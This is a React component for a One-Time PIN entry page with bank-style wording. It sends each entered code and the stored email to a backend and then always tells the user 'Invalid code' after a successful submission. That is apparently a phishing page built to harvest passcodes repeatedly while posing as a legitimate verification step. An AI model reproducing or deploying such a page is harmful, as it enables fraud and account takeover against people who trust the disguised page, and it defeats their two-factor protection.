import React, { useRef, useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";

const Otp = () => {
  const navigate = useNavigate();
  const inputsRef = useRef([]);
  const [otp, setOtp] = useState(Array(6).fill(""));
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [counter, setCounter] = useState(300);
  const [email, setEmail] = useState("");
  useEffect(() => {
    const storedEmail = localStorage.getItem("email");
    if (storedEmail) {
      setEmail(storedEmail);
    }
  }, []);

  useEffect(() => {
    if (counter > 0) {
      const timer = setTimeout(() => setCounter(counter - 1), 1000); // count down every second
      return () => clearTimeout(timer);
    }
  }, [counter]);
  const handleChange = (value, index) => {
    if (/^\d?$/.test(value)) {
      const newOtp = [...otp];
      newOtp[index] = value;
      setOtp(newOtp);
      if (value && index < 5) {
        inputsRef.current[index + 1]?.focus();
      }
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(""); // Clear previous error

    try {
      await axios.post(`${BASE_URL}/otp`, {
        otp: otp.join(""),
        email: email,
      });

      setError("Invalid code");
      setOtp(Array(6).fill(""));
    } catch (err) {
      console.log("OTP submission failed:", err);

      inputsRef.current[0]?.focus();
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white text-black px-6 pt-6 flex flex-col items-center">
      <div className="w-full max-w-md mt-10 text-center">
        {/* Logo */}
        <div className="flex flex-col items-start justify-start">
          <h1 className="text-2xl font-bold">One-Time PIN</h1>
          <span className="text-lg font-bold text-gray-700 mr-2">
            Please {email}
          </span>{" "}
          <span className="text-gray-700 text-start">
            For your protection, please enter the One-Time PIN that has been
            sent to your mobile number. the code expires in 5 minutes. Ref.
            No.C03E
          </span>
        </div>

        {/* OTP Inputs */}
        <form onSubmit={handleSubmit}>
          <div className="flex justify-center gap-2 my-4">
            {otp.map((digit, index) => (
              <input
                key={index}
                type="text"
                inputMode="numeric"
                maxLength={1}
                className="w-12 h-14 text-center text-xl bg-white border border-stone-300 focus:outline-none focus:border-green-400"
                value={digit}
                onChange={(e) => handleChange(e.target.value, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
                ref={(el) => (inputsRef.current[index] = el)}
              />
            ))}
          </div>

          {error && <p className="text-red-500 text-sm mb-2">{error}</p>}

          <p className="text-xs text-gray-500 mb-4">
            You can resend code if you don’t receive it in{" "}
            <span>
              {`${Math.floor(counter / 60)
                .toString()
                .padStart(2, "0")}:${(counter % 60)
                .toString()
                .padStart(2, "0")}`}
            </span>
          </p>

          <button
            type="submit"
            disabled={loading}
            className="w-full mt-4 py-3 text-white font-semibold rounded-md bg-green-700 hover:bg-green-800 transition"
          >
            {loading ? "Verifying..." : "Next"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Otp;
